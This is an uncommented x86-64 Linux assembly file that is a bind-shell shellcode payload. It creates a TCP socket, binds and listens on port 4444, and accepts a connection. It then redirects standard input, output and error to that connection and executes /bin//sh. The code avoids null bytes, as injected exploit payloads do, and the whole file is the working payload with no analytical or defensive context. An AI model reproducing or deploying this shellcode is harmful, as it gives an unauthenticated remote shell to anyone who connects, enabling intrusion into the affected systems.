global _start

_start:

	mov al, 41
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	add rsi, 1
	xor rdx, rdx	
	syscall

	mov rdi, rax

	xor rax, rax

	push rax

	mov dword [rsp - 4], eax
	mov word [rsp - 6], 0x5c11
	mov byte [rsp - 8], 0x2
	sub rsp, 8

	add rax, 49
	
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall

	xor rax, rax
	add rax, 50
	xor rsi, rsi
	add rsi, 2
	syscall

	xor rax, rax
	add rax, 43
	sub rsp, 16
	mov rsi, rsp
	mov byte [rsp - 1], 16
	sub rsp, 1
	mov rdx, rsp

	syscall

	mov r9, rax
	
	xor rax, rax
	add rax, 3
	syscall

	mov rdi, r9
	xor rax, rax
	add rax, 33
	xor rsi, rsi
	syscall

	xor rax, rax
	add rax, 33
	xor rsi, rsi
	add rsi, 1
	syscall

	xor rax, rax
	add rax, 33
	xor rsi, rsi
	add rsi, 2
	syscall

	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx

	mov rdi, rsp

	push rax

	mov rdx, rsp

	push rdi
	
	mov rsi, rsp

	add rax, 59
	syscall
